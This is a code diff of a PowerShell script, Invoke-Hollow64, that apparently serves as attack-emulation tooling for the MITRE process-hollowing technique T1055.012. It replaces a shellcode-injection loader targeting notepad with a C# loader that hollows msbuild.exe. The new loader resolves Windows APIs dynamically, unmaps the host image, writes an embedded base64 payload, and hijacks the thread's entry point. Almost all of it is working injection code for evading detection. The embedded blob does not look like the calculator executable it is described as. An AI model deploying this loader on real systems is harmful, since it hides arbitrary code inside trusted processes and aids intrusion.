@@ -5,7 +5,7 @@ Process hollowing is a "living-off-the-land" method of executing arbitrary code 
 https://attack.mitre.org/techniques/T1055/012/
 
 .DESCRIPTION
-
+Hollowing legitimate windows .NET msbuild process with a .NET calculator process
  
 .EXAMPLE
 Invoke-Hollow64
@@ -15,500 +15,284 @@ Invoke-Hollow64
 
 $Hollow64 = @"
 using System;
-using System.Collections.Generic;
-using System.Runtime.InteropServices;
+using System.IO;
 using System.Text;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
 
-namespace Hollowing
+namespace PEHollow
 {
-    public sealed class Loader
-    {	
-		public static byte[] target_ = Encoding.ASCII.GetBytes("calc.exe");
-		public static string HollowedProcessX85 = "C:\\Windows\\SysWOW64\\notepad.exe";
+    public sealed class Program
+    {
 
-        [StructLayout(LayoutKind.Sequential)]
-        public struct PROCESS_INFORMATION
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        private struct ProcessInformation
         {
-            public IntPtr hProcess;
-            public IntPtr hThread;
-            public int dwProcessId;
-            public int dwThreadId;
-        }
+            public readonly IntPtr ProcessHandle;
 
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct PROCESS_BASIC_INFORMATION
-        {
-            public IntPtr Reserved1;
-            public IntPtr PebAddress;
-            public IntPtr Reserved2;
-            public IntPtr Reserved3;
-            public IntPtr UniquePid;
-            public IntPtr MoreReserved;
-        }
+            public readonly IntPtr ThreadHandle;
 
-        [StructLayout(LayoutKind.Sequential)]
-        internal struct STARTUPINFO
-        {
-            uint cb;
-            IntPtr lpReserved;
-            IntPtr lpDesktop;
-            IntPtr lpTitle;
-            uint dwX;
-            uint dwY;
-            uint dwXSize;
-            uint dwYSize;
-            uint dwXCountChars;
-            uint dwYCountChars;
-            uint dwFillAttributes;
-            uint dwFlags;
-            ushort wShowWindow;
-            ushort cbReserved;
-            IntPtr lpReserved2;
-            IntPtr hStdInput;
-            IntPtr hStdOutput;
-            IntPtr hStdErr;
-        }
+            public readonly uint ProcessId;
 
-        public const uint PageReadWriteExecute = 0x40;
-        public const uint PageReadWrite = 0x04;
-        public const uint PageExecuteRead = 0x20;
-        public const uint MemCommit = 0x00001000;
-        public const uint SecCommit = 0x08000000;
-        public const uint GenericAll = 0x10000000;
-        public const uint CreateSuspended = 0x00000004;
-        public const uint DetachedProcess = 0x00000008;
-        public const uint CreateNoWindow = 0x08000000;
-
-        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);
-
-        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);
-
-        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern void GetSystemInfo(ref SYSTEM_INFO lpSysInfo);
-
-        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern IntPtr GetCurrentProcess();
-
-        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern void CloseHandle(IntPtr handle);
-
-        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);
-
-        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
-        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref STARTUPINFO lpStartinfo, out PROCESS_INFORMATION lpProcInformation);
-
-        [DllImport("kernel32.dll")]
-        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern uint ResumeThread(IntPtr hThread);
-
-        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
-        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
-
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
-
-
-        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);
-
-
-        [DllImport("kernel32.dll")]
-        static extern uint GetLastError();
-
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SYSTEM_INFO
-        {
-            public uint dwOem;
-            public uint dwPageSize;
-            public IntPtr lpMinAppAddress;
-            public IntPtr lpMaxAppAddress;
-            public IntPtr dwActiveProcMask;
-            public uint dwNumProcs;
-            public uint dwProcType;
-            public uint dwAllocGranularity;
-            public ushort wProcLevel;
-            public ushort wProcRevision;
+            private readonly uint ThreadId;
         }
 
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
-        public struct LARGE_INTEGER
+        private struct StartupInformation
         {
-            public uint LowPart;
-            public int HighPart;
+            public uint Size;
+
+            private readonly string Reserved1;
+
+            private readonly string Desktop;
+
+            private readonly string Title;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
+            private readonly byte[] Misc;
+
+            private readonly IntPtr Reserved2;
+
+            private readonly IntPtr StdInput;
+
+            private readonly IntPtr StdOutput;
+
+            private readonly IntPtr StdError;
         }
 
-        IntPtr section_;
-        IntPtr localmap_;
-        IntPtr remotemap_;
-        IntPtr localsize_;
-        IntPtr remotesize_;
-        IntPtr pModBase_;
-        IntPtr pEntry_;
-        uint rvaEntryOffset_;
-        uint size_;
-        byte[] inner_;
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandleA(string dllToLoad);
 
-        public uint round_to_page(uint size)
+	[DllImport("kernel32.dll")]
+	private static extern IntPtr LoadLibraryA(string dllName);
+
+	[DllImport("kernel32.dll")]
+	private static extern IntPtr VirtualProtect(IntPtr addr,int size,uint priv, out uint oldpriv);
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool LoadedCreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool LoadedGetThreadContext(IntPtr thread, int[] context);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool LoadedWow64GetThreadContext(IntPtr thread, int[] context);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool LoadedSetThreadContext(IntPtr thread, int[] context);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool LoadedWow64SetThreadContext(IntPtr thread, int[] context);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool LoadedReadProcessMemory(IntPtr process, long baseAddress, ref long buffer, int bufferSize, ref int bytesRead);
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate bool LoadedWriteProcessMemory(IntPtr process, long baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int LoadedNtUnmapViewOfSection(IntPtr process, long baseAddress);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long LoadedVirtualAllocEx(IntPtr handle, long address, int length, int type, int protect);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int LoadedResumeThread(IntPtr handle, long suspendeCount);
+        [DllImport("kernel32.dll")]
+
+        static extern uint GetLastError();
+
+        private static long Long(int left, int right)
         {
-            SYSTEM_INFO info = new SYSTEM_INFO();
-
-            GetSystemInfo(ref info);
-
-            return (info.dwPageSize - size % info.dwPageSize) + size;
+            long resHigh = ((long)left) << 32;
+            long resLow = (long)right & 0x00000000ffffffff;
+            return resHigh | resLow;
         }
-
-        const int AttributeSize = 24;
-
-        private bool nt_success(long v)
+        public static bool Run(string path, byte[] data)
         {
-            return (v >= 0);
-        }
-
-        public IntPtr GetCurrent()
-        {
-            return GetCurrentProcess();
-        }
-
-
-
-        /***
-         *  Maps a view of the current section into the process specified in procHandle.
-         */
-        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
-        {
-            IntPtr baseAddr = addr;
-            IntPtr viewSize = (IntPtr)size_;
-
-
-            long status = ZwMapViewOfSection(section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0, protect);
-
-            if (!nt_success(status))
-                throw new SystemException("[x] Something went wrong! " + status);
-
-            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
-        }
-
-        /***
-         *  Attempts to create an RWX section of the given size 
-         */
-        public bool CreateSection(uint size)
-        {
-            LARGE_INTEGER liVal = new LARGE_INTEGER();
-            size_ = round_to_page(size);
-            liVal.LowPart = size_;
-
-            long status = ZwCreateSection(ref section_, GenericAll, (IntPtr)0, ref liVal, PageReadWriteExecute, SecCommit, (IntPtr)0);
-
-            return nt_success(status);
-        }
-
-
-
-        /***
-         *  Maps a view of the section into the current process
-         */
-        public void SetLocalSection(uint size)
-        {
-
-            KeyValuePair<IntPtr, IntPtr> vals = MapSection(GetCurrent(), PageReadWriteExecute, IntPtr.Zero);
-            if (vals.Key == (IntPtr)0)
-                throw new SystemException("[x] Failed to map view of section!");
-
-            localmap_ = vals.Key;
-            localsize_ = vals.Value;
-
-        }
-
-        /***
-         * Copies the shellcode buffer into the section 
-         */
-        public void CopyShellcode(byte[] buf)
-        {
-            long lsize = size_;
-            if (buf.Length > lsize)
-                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");
-
-            unsafe
+            int num = 1;
+            do
             {
-                byte* p = (byte*)localmap_;
-
-                for (int i = 0; i < buf.Length; i++)
+                if (HandleRun(path, data))
                 {
-                    p[i] = buf[i];
+                    return true;
                 }
+                num = checked(num + 1);
             }
+            while (num <= 4);
+            return false;
         }
 
-        /***
-         *  Create a new process using the binary located at "path", starting up suspended.
-         */
-        public PROCESS_INFORMATION StartProcess(string path)
+        private static bool HandleRun(string path, byte[] data)
         {
-            STARTUPINFO startInfo = new STARTUPINFO();
-            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
-
-            uint flags = CreateSuspended;// | DetachedProcess | CreateNoWindow;
-
-            if (!CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, false, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo))
-                throw new SystemException("[x] Failed to create process!");
-
-
-            return procInfo;
-        }
-
-        const ulong PatchSize = 0x10;
-
-        /***
-         *  Constructs the shellcode patch for the new process entry point. It will build either an x86 or x64 payload based
-         *  on the current pointer size.
-         *  Ultimately, we will jump to the shellcode payload
-         */
-        public KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
-        {
-            int i = 0;
-            IntPtr ptr;
-
-            ptr = Marshal.AllocHGlobal((IntPtr)PatchSize);
-
-            unsafe
+            int bytesRead = 0;
+            string commandLine = "\"" + path + "  /nologo /nodemode:1 /nr \"";
+            StartupInformation startupInfo = default(StartupInformation);
+            ProcessInformation processInformation = default(ProcessInformation);
+            startupInfo.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
+            checked
             {
-				byte*  p = (byte*)ptr;
-                byte[] tmp = null;
-
-                if (IntPtr.Size == 4)
+                try
                 {
-                    p[i] = 0xb8; // mov eax, <imm4>
-                    i++;
-                    Int32 val = (Int32)dest;
-                    tmp = BitConverter.GetBytes(val);
+                    IntPtr pDll = GetModuleHandleA("kernel32");
+
+                    if (pDll == IntPtr.Zero)
+                    {
+                        throw new Exception();
+                    }
+
+
+                    IntPtr pAddressOfFunctionToCall = GetProcAddress(pDll, "CreateProcessA");
+                    LoadedCreateProcess CreateProcessA = (LoadedCreateProcess)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall,
+                                                                                                typeof(LoadedCreateProcess));
+                    pAddressOfFunctionToCall = GetProcAddress(pDll, "ReadProcessMemory");
+                    LoadedReadProcessMemory ReadProcessMemory = (LoadedReadProcessMemory)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall,
+                                                                                                typeof(LoadedReadProcessMemory));
+                    pAddressOfFunctionToCall = GetProcAddress(pDll, "VirtualAllocEx");
+                    LoadedVirtualAllocEx VirtualAllocEx = (LoadedVirtualAllocEx)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall,
+                                                                                                typeof(LoadedVirtualAllocEx));
+                    pAddressOfFunctionToCall = GetProcAddress(pDll, "WriteProcessMemory");
+                    LoadedWriteProcessMemory WriteProcessMemory = (LoadedWriteProcessMemory)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall,
+                                                                                                typeof(LoadedWriteProcessMemory));
+                    pAddressOfFunctionToCall = GetProcAddress(pDll, "GetThreadContext");
+                    LoadedGetThreadContext GetThreadContext = (LoadedGetThreadContext)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall, typeof(LoadedGetThreadContext));
+
+                    pAddressOfFunctionToCall = GetProcAddress(pDll, "SetThreadContext");
+                    LoadedSetThreadContext SetThreadContext = (LoadedSetThreadContext)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall, typeof(LoadedSetThreadContext));
+
+                    pDll = GetModuleHandleA("ntdll");
+                    if (pDll == IntPtr.Zero)
+                    {
+                        throw new Exception();
+                    }
+                    pAddressOfFunctionToCall = GetProcAddress(pDll, "NtUnmapViewOfSection");
+                    LoadedNtUnmapViewOfSection NtUnmapViewOfSection = (LoadedNtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall, typeof(LoadedNtUnmapViewOfSection));
+
+                    pAddressOfFunctionToCall = GetProcAddress(pDll, "NtResumeThread");
+                    LoadedResumeThread NtResumeThread = (LoadedResumeThread)Marshal.GetDelegateForFunctionPointer(
+                                                                                                pAddressOfFunctionToCall,
+                                                                                                 typeof(LoadedResumeThread));
+
+
+                    if (!CreateProcessA(path, commandLine, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
+                    {
+                        throw new Exception();
+                    }
+                    int lfanew = BitConverter.ToInt32(data, 60);
+
+                    long ImageBaseSrc = BitConverter.ToInt64(data, lfanew + 26 + 22);
+
+                    int[] context = new int[308] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1048587, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
+
+
+
+                    if (!GetThreadContext(processInformation.ThreadHandle, context))
+                    {
+                        throw new Exception();
+                    }
+
+                    long Rdx = Long(context[35], context[34]);
+
+                    long ImageBaseTarget = 0;
+
+
+
+                    if (!ReadProcessMemory(processInformation.ProcessHandle, Rdx + 4 + 4 + 8, ref ImageBaseTarget, 8, ref bytesRead))
+                    {
+                        throw new Exception();
+                    }
+
+
+                    if (ImageBaseSrc == ImageBaseTarget && NtUnmapViewOfSection(processInformation.ProcessHandle, ImageBaseSrc) != 0)
+                    {
+                        throw new Exception();
+                    }
+                    int SizeOfImageSrc = BitConverter.ToInt32(data, lfanew + 80);
+                    int SizeOfHeadersSrc = BitConverter.ToInt32(data, lfanew + 42 + 42);
+                    bool flag = false;
+
+
+
+                    long NewBaseAddress = VirtualAllocEx(processInformation.ProcessHandle, ImageBaseSrc, SizeOfImageSrc, 12288, 64);
+                    if (NewBaseAddress == 0)
+                    {
+                        throw new Exception();
+                    }
+
+
+                    if (!WriteProcessMemory(processInformation.ProcessHandle, NewBaseAddress, data, SizeOfHeadersSrc, ref bytesRead))
+                    {
+                        throw new Exception();
+                    }
+                    int pSecH = lfanew + 264;
+                    short NumberOfSections = BitConverter.ToInt16(data, lfanew + 6);
+                    int num7 = NumberOfSections - 1;
+                    for (int i = 0; i <= num7; i++)
+                    {
+                        int VirtualAddressRva = BitConverter.ToInt32(data, pSecH + 12);
+                        int RawSize = BitConverter.ToInt32(data, pSecH + 16);
+                        int RawAddressRva = BitConverter.ToInt32(data, pSecH + 20);
+                        if (RawSize != 0)
+                        {
+                            byte[] section = new byte[RawSize];
+                            Buffer.BlockCopy(data, RawAddressRva, section, 0, section.Length);
+                            if (!WriteProcessMemory(processInformation.ProcessHandle, NewBaseAddress + VirtualAddressRva, section, section.Length, ref bytesRead))
+                            {
+                                throw new Exception();
+                            }
+                        }
+                        pSecH += 40;
+                    }
+                    byte[] bytes = BitConverter.GetBytes(NewBaseAddress);
+                    if (!WriteProcessMemory(processInformation.ProcessHandle, Rdx + 8 + 8, bytes, 8, ref bytesRead))
+                    {
+                        throw new Exception();
+                    }
+                    int AddressOfEntryOffset = BitConverter.ToInt32(data, lfanew + 40);
+                    if (flag)
+                    {
+                        NewBaseAddress = ImageBaseSrc;
+                    }
+                    byte[] newEntryPoint = BitConverter.GetBytes(checked((long)NewBaseAddress + AddressOfEntryOffset));
+                    context[33] = BitConverter.ToInt32(newEntryPoint, 4);
+                    context[32] = BitConverter.ToInt32(newEntryPoint, 0);
+
+                    if (!SetThreadContext(processInformation.ThreadHandle, context))
+                    {
+                        throw new Exception();
+                    }
+                    if (NtResumeThread(processInformation.ThreadHandle, 0) == -1)
+                    {
+                        throw new Exception();
+                    }
                 }
-                else
+                catch (Exception)
                 {
-                    p[i] = 0x48; // rex
-                    i++;
-                    p[i] = 0xb8; // mov rax, <imm8>
-                    i++;
-
-                    Int64 val = (Int64)dest;
-                    tmp = BitConverter.GetBytes(val);
+                    Process processById = Process.GetProcessById(Convert.ToInt32(processInformation.ProcessId));
+                    processById.Kill();
+                    return false;
                 }
-
-                for (int j = 0; j < IntPtr.Size; j++)
-                    p[i + j] = tmp[j];
-
-                i += IntPtr.Size;
-                p[i] = 0xff;
-                i++;
-                p[i] = 0xe0; // jmp [r|e]ax
-                i++;
-            }
-
-            return new KeyValuePair<int, IntPtr>(i, ptr);
-        }
-
-
-        /**
-         * We will locate the entry point for the main module in the remote process for patching.
-         */
-        private IntPtr GetEntryFromBuffer(byte[] buf)
-        {
-            IntPtr res = IntPtr.Zero;
-            unsafe
-            {
-                fixed (byte* p = buf)
-                {
-                    uint e_lfanew_offset = *((uint*)(p + 0x3c)); // e_lfanew offset in IMAGE_DOS_HEADERS
-
-                    byte* nthdr = (p + e_lfanew_offset);
-
-                    byte* opthdr = (nthdr + 0x18); // IMAGE_OPTIONAL_HEADER start
-
-                    ushort t = *((ushort*)opthdr);
-
-                    byte* entry_ptr = (opthdr + 0x10); // entry point rva
-
-                    int tmp = *((int*)entry_ptr);
-
-                    rvaEntryOffset_ = (uint)tmp;
-
-                    // rva -> va
-                    if (IntPtr.Size == 4)
-                        res = (IntPtr)(pModBase_.ToInt32() + tmp);
-                    else
-                        res = (IntPtr)(pModBase_.ToInt64() + tmp);
-
-                }
-            }
-
-            pEntry_ = res;
-            return res;
-        }
-
-        /**
-         *  Locate the module base addresss in the remote process,
-         *  read in the first page, and locate the entry point.
-         */
-        public IntPtr FindEntry(IntPtr hProc)
-        {
-            PROCESS_BASIC_INFORMATION basicInfo = new PROCESS_BASIC_INFORMATION();
-            uint tmp = 0;
-
-            long success = ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
-            if (!nt_success(success))
-                throw new SystemException("[x] Failed to get process information!");
-
-            IntPtr readLoc = IntPtr.Zero;
-            byte[] addrBuf = new byte[IntPtr.Size];
-            if (IntPtr.Size == 4)
-            {
-                readLoc = (IntPtr)((Int32)basicInfo.PebAddress + 8);
-            }
-            else
-            {
-                readLoc = (IntPtr)((Int64)basicInfo.PebAddress + 16);
-            }
-
-            IntPtr nRead = IntPtr.Zero;
-
-            if (!ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero)
-                throw new SystemException("[x] Failed to read process memory!");
-
-            if (IntPtr.Size == 4)
-                readLoc = (IntPtr)(BitConverter.ToInt32(addrBuf, 0));
-            else
-                readLoc = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
-
-            pModBase_ = readLoc;
-            if (!ReadProcessMemory(hProc, readLoc, inner_, inner_.Length, out nRead) || nRead == IntPtr.Zero)
-                throw new SystemException("[x] Failed to read module start!");
-
-            return GetEntryFromBuffer(inner_);
-        }
-
-        /**
-         *  Map our shellcode into the remote (suspended) process,
-         *  locate and patch the entry point (so our code will run instead of
-         *  the original application), and resume execution.
-         */
-        public void MapAndStart(PROCESS_INFORMATION pInfo)
-        {
-
-            KeyValuePair<IntPtr, IntPtr> tmp = MapSection(pInfo.hProcess, PageReadWriteExecute, IntPtr.Zero);
-            if (tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0)
-                throw new SystemException("[x] Failed to map section into target process!");
-
-            remotemap_ = tmp.Key;
-            remotesize_ = tmp.Value;
-
-            KeyValuePair<int, IntPtr> patch = BuildEntryPatch(tmp.Key);
-
-            try
-            {
-
-                IntPtr pSize = (IntPtr)patch.Key;
-                IntPtr tPtr = new IntPtr();
-
-                if (!WriteProcessMemory(pInfo.hProcess, pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero)
-                    throw new SystemException("[x] Failed to write patch to start location! " + GetLastError());
-            }
-            finally
-            {
-                if (patch.Value != IntPtr.Zero)
-                    Marshal.FreeHGlobal(patch.Value);
-            }
-
-            byte[] tbuf = new byte[0x1000];
-            IntPtr nRead = new IntPtr();
-            if (!ReadProcessMemory(pInfo.hProcess, pEntry_, tbuf, 1024, out nRead))
-                throw new SystemException("Failed!");
-
-            uint res = ResumeThread(pInfo.hThread);
-            if (res == unchecked((uint)-1))
-                throw new SystemException("[x] Failed to restart thread!");
-
-        }
-
-        public IntPtr GetBuffer()
-        {
-            return localmap_;
-        }
-        ~Loader()
-        {
-            if (localmap_ != (IntPtr)0)
-                ZwUnmapViewOfSection(section_, localmap_);
-
-        }
-
-        public void Load(string targetProcess, byte[] shellcode)
-        {
-
-            PROCESS_INFORMATION pinf = StartProcess(targetProcess);
-            FindEntry(pinf.hProcess);
-
-            if (!CreateSection((uint)shellcode.Length))
-                throw new SystemException("[x] Failed to create new section!");
-
-            SetLocalSection((uint)shellcode.Length);
-
-            CopyShellcode(shellcode);
-
-
-            MapAndStart(pinf);
-
-            CloseHandle(pinf.hThread);
-            CloseHandle(pinf.hProcess);
-
-        }
-
-        public Loader()
-        {
-            section_ = new IntPtr();
-            localmap_ = new IntPtr();
-            remotemap_ = new IntPtr();
-            localsize_ = new IntPtr();
-            remotesize_ = new IntPtr();
-            inner_ = new byte[0x1000]; // Reserve a page of scratch space
-        }
-        public static void Run()
-        {
-
-            /* Run Calc */
-            byte[] shellcode = new byte[184] {
-            0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
-            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
-            0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
-            0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
-            0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
-            0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
-            0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
-            0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
-            0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
-            0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
-            0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
-            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
-            0x00,0x53,0xff,0xd5 };
-
-            byte[] finalshellcode = new byte[shellcode.Length + target_.Length+1];
-            Array.Copy(shellcode, finalshellcode, shellcode.Length);
-            Array.Copy(target_, 0, finalshellcode, shellcode.Length, target_.Length);
-            finalshellcode[shellcode.Length + target_.Length] = 0;
-			
-            Loader ldr = new Loader();
-            try
-            {
-                ldr.Load(HollowedProcessX85, finalshellcode);
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("[x] Something went wrong!" + e.Message);
+                return true;
             }
         }
 
+        public static void Main()
+        {
+
+			string binaryInb64Str = "BwIAAAAkAABSU0EyAAQAAAEAAQC1fii/8MpR5WWVlm8Kakos38ov4mWNnAo03veCOsKA+3GYGXErc+zo7MlCMr9U5Jx74CzxT9JC73xRwTOBr6qLk1o2UxwyqIJtG6eCH5OprcbaFitqtssE2Kpt2g9OrhQXWl5Kl8mIhyaEJket7xyeSv4i/+D95Crs+e8WkNd4vz/vUp+DdJITNg4emFMssabfRPmzvPPZPYhbwo17VjlMosx744WMWwjmgjdrLPORJtks1M8a8swS5Ztk2bBT1ekLCRGnJZpnn21EmJsC0O66LX1KNIYZB+GGQJUXSJzL0AqtCf8HxlR2m6dYlwFGI/uWSImt3J80EjXcEUWefZ/RR5id2a3TNk18jjZ1k5043iGNRXklBBQPqeAIN+BgRiRHkGZ74+DeAP5nF/kJF8qZFlWFkqcBBwlLrOedlbOMY0G/whw01ikB9gwyYqaapat1zzN3Z/PslVc4d2qCCPwoabWbiqhNyA/JTvcjhNI3cPOjgJ9EdBToawuMMdkQxp+LbXP3nn6U0uuLMilaT7YZx4wjp3Za79hntfetMGxzgOXdSgChnahletxNbK3w8LV56ZOrphX7WRdeMWAJhZODhbIVAufs2A3yGIOOZCQoqpXPIM6ZL8NH38Y6iVSrgibvduRjPFvhjfLLOHbz1ljeEYV6rkFLZcsTG4kj7Pn/lHWjHD+GJVwdcwGeLibt2QJZ10YD1XA+PoQl7O02vu0gzA9FOeZC/UW8BKfbOWG0IXWNlIGkBSOpLRakcao60Lw=";
+
+            byte[] executable = Convert.FromBase64String(binaryInb64Str);
+
+            Run(Environment.GetEnvironmentVariable("WINDIR") +
+                @"\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe", executable);
+        }
     }
 }
 "@
@@ -524,13 +308,11 @@ function Invoke-Hollow64 {
         [String]$program= ''
     )
     Begin {
-		$cp = New-Object System.CodeDom.Compiler.CompilerParameters
-		$cp.CompilerOptions = '/unsafe'
-		Add-Type $Hollow64 -CompilerParameters $cp
+		Add-Type $Hollow64 
     }
 
     Process {
-		[Hollowing.Loader]::Run()
+		[PEHollow.Program]::Main()
     }
 
 }
